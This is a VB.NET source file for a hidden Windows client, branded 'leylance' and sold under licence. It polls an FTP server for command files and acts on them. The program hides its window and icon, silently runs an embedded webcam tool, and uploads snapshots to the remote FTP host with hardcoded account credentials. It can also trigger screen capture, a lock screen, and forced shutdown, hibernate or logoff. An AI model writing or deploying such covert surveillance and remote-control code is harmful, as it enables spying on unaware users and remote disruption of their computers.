Imports System.IO
Imports Microsoft.Win32
Imports System.Net

Public Class Form1
    '<//-----------------------Main Config Strings---------------------------//>

    Dim userpanel As String = My.Settings.userpanel
    Dim panelpass As String = My.Settings.panelpass
    Dim newpc As String = "BFEBFBFF000506E3"
    Dim webcamdir As String = "webcam" + My.Settings.imgexten
    Dim lifetime As String = My.Settings.lifetime
    Dim prodexpire As Date = "16-Sep-2019"
    Dim ownexe As String = IO.Path.GetFileName(Application.ExecutablePath)

    '<//------------------------Flag Section---------------------------------//>

    Dim webci As Integer = 0
    Dim scrncpi As Integer = 0
    Dim shutdwni As Integer = 0
    Dim lckoi As Integer = 0
    Dim slepei As Integer = 0
    Dim ologfi As Integer = 0
    '<//-----------------------Multi Thread Section--------------------------//>
    Dim webc As System.Threading.Thread = New System.Threading.Thread(AddressOf webcth)
    Dim scrncp As System.Threading.Thread = New System.Threading.Thread(AddressOf scrncpth)
    Dim lcko As System.Threading.Thread = New System.Threading.Thread(AddressOf lckoth)
    Dim shutdwn As System.Threading.Thread = New System.Threading.Thread(AddressOf shutdwnth)
    Dim slepe As System.Threading.Thread = New System.Threading.Thread(AddressOf slepeth)
    Dim ologf As System.Threading.Thread = New System.Threading.Thread(AddressOf ologfth)

    '<//---------------------------------------------------------------------//>


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Size = Size.Empty
        Me.Visible = False
        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        'pccpu()
        'expirdown()
        If DateTime.Now.ToString("dd-MMM-yyyy") >= prodexpire And lifetime = "false" Then
            MsgBox("Product Expired! Please Renew your product for further use.")
            End
        End If
        Dim chckinter As String = CheckForInternetConnection()
        If chckinter = True Then
            scrncp.Start()
            webc.Start()
            lcko.Start()
            shutdwn.Start()
            slepe.Start()
            ologf.Start()
        ElseIf chckinter = False Then
            Dim cam As New ProcessStartInfo("nointr.bat")
            cam.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(cam).WaitForExit()
            End
        End If

    End Sub
    Public Shared Function CheckForInternetConnection() As Boolean
        Try
            Using client = New WebClient()
                Using stream = client.OpenRead("http://www.google.com")
                    Return True
                End Using
            End Using
        Catch
            Return False
        End Try
    End Function
    Private Sub webbrows(url As String, filename As String)
        'Check And Download Files
        Try
            Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create(url), System.Net.FtpWebRequest)
            mReq.Credentials = New System.Net.NetworkCredential("u945780831." + userpanel, panelpass)
            mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize
            'End
            'My.Computer.Network.DownloadFile(url, filename, "u945780831." + userpanel, panelpass)
            mReq.Credentials = New System.Net.NetworkCredential("u945780831." + userpanel, panelpass)
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            If filename = "webc.llance" Then
                webcamprocess()
            ElseIf filename = "lcko.llance" Then
                leylock.ShowDialog()
            ElseIf filename = "scrpcp.llance" Then
                screencap.ShowDialog()
            ElseIf filename = "shutdwn.llance" Then
                Shell("shutdown /s /f /t 10")
                MsgBox("Device Will Shutdown Within 10 Seconds!")
                End
            ElseIf filename = "slepe.llance" Then
                Shell("shutdown /h /f")
            ElseIf filename = "ologf.llance" Then
                Shell("shutdown /l /f")
            End If
        Catch ex As WebException
            Dim checkreq As FtpWebResponse = ex.Response
            If FtpStatusCode.ActionNotTakenFileUnavailable = checkreq.StatusCode Then

            End If
        End Try
    End Sub
    Private Sub webcth()
        webbrows("ftp://ftp.leylance.xyz/procedures/df541vfd4v1fs5v1ad65cv1dav6511web6as5dasas6c1cam65fv41s65vdsv5d65s1va65s1cs65c1asc/webc.llance", "webc.llance")
        webci = 1
    End Sub
    Private Sub scrncpth()
        webbrows("ftp://ftp.leylance.xyz/procedures/vdkjvdjcascsuicbasucbcapturejsncajknscreenlasdjclnasclnscljnascladjncaljcnaslcnkls/scrncp.llance", "scrncp.llance")
        scrncpi = 1
    End Sub
    Private Sub lckoth()
        webbrows("ftp://ftp.leylance.xyz/procedures/euivhdavjdhvdsivudvlocdauhkssauoacacsacoasnciosjaidhiovhadsfiosaicasiiaoshcaiocasi/lcko.llance", "lcko.llance")
        lckoi = 1
    End Sub
    Private Sub shutdwnth()
        webbrows("ftp://ftp.leylance.xyz/procedures/lsidvndsvndsvndvndsvkjshutdolsnvsldvnwnkslancaslkncaslkcnlsncalskckldnvdvkndvvfnvl/shutdwn.llance", "shutdwn.llance")
        shutdwni = 1
    End Sub
    Private Sub slepeth()
        webbrows("ftp://ftp.leylance.xyz/procedures/vfjvnasslcnsavljavnhibernetsacbsacjbvkddkjvbdvjavkjasbcasjcsjbvaskjvdajvkbdvkdjsvd/slepe.llance", "slepe.llance")
        slepei = 1
    End Sub
    Private Sub ologfth()
        webbrows("ftp://ftp.leylance.xyz/procedures/qkvnavndvjndskvjoffasjcnlogsajcnasjcnacnadlkcnddklvndlkvnadvklnakvcasnvklancsackns/ologf.llance", "ologf.llance")
        ologfi = 1
    End Sub

    Private Sub pccpu()

        Dim computer As String = "."
        Dim wmi As Object = GetObject("winmgmts:" &
        "{impersonationLevel=impersonate}!\\" &
        computer & "\root\cimv2")
        Dim processors As Object = wmi.ExecQuery("Select * from " &
        "Win32_Processor")

        Dim cpu_ids As String = ""
        For Each cpu As Object In processors
            cpu_ids = cpu_ids & ", " & cpu.ProcessorId
        Next cpu
        If cpu_ids.Length > 0 Then cpu_ids =
        cpu_ids.Substring(2)
        If Not newpc = cpu_ids Then
            MsgBox("This Product Does Not Belong To You!")
            End
        End If
    End Sub

    Private Sub expirdown()
        'check for expired order
        If File.Exists("ley.lance") Then
            Dim expirdat As String = FileLen("ley.lance")
            If expirdat > 0 Then
                MsgBox("Product Expired!")
                End
            Else
                File.Delete("ley.lance")
            End If
        End If

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/ley.lance", "ley.lance", "u945780831." + userpanel, panelpass)
            If File.Exists("ley.lance") Then
                File.Delete("ley.lance")

            Else
                MsgBox("Product Expired!")
                End
            End If

        Catch ex As WebException
            MsgBox("Product Expired!")
            End
        End Try

    End Sub


    Private Sub expiracheck()
        ' online expire check
        If File.Exists("ley.lance") Then
            Dim expirdat As String
            expirdat = FileLen("ley.lance")
            If expirdat > "0" Then
                MsgBox("Product Expired!")
                File.Delete("ley.lance")
                Application.Exit()

            ElseIf expirdat = "0" Then
                File.Delete("ley.lance")


            End If
        Else

        End If
    End Sub
    Private Sub webcamprocess()
        'Upload Webcam Image
        Dim rannumber As String
        Dim rannumstring As String
        Try
            If File.Exists("image.bmp") Then


                Dim number As Integer

                Randomize()

                number = Int(Rnd() * 10000) + 1
                rannumstring = number

                rannumber = DateTime.Now.ToString("dd-MMM-yyyy hh:mm:ss tt") + "_" + rannumstring + ".bmp"
                My.Computer.Network.UploadFile("image.bmp", "ftp://ftp.leylance.xyz/" + webcamdir + "/10106f65b1s65v1d6v1dsv65ds1v65dsv65ds1v65dsvds65v1ds65v1ds65v1dss65bg65bngn65D65ascs6ac1asc61asc651asc651v3Fb65fdBf65b3F65vDSAv6ds5Vd6s/" + rannumber, "u945780831." + userpanel, panelpass)
                File.Delete("image.bmp")
            Else
                clickcam()
            End If
        Catch ex As WebException
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub clickcam()
        ' Click Webcam Snap If Webc.llance Exists
        Dim webcm As String = "cam.exe"
        IO.File.WriteAllBytes(webcm, My.Resources.cam)

        Dim cam As New ProcessStartInfo(webcm)
        cam.WindowStyle = ProcessWindowStyle.Hidden
        Process.Start(cam).WaitForExit()
        File.Delete("cam.exe")
        webcamprocess()
    End Sub

    Private Sub nointernet_Tick(sender As Object, e As EventArgs) Handles nointernet.Tick
        If webci = 1 And scrncpi = 1 And lckoi = 1 And shutdwni = 1 And slepei = 1 And ologfi = 1 Then
            Process.Start(ownexe)
            End
        End If
    End Sub
End Class
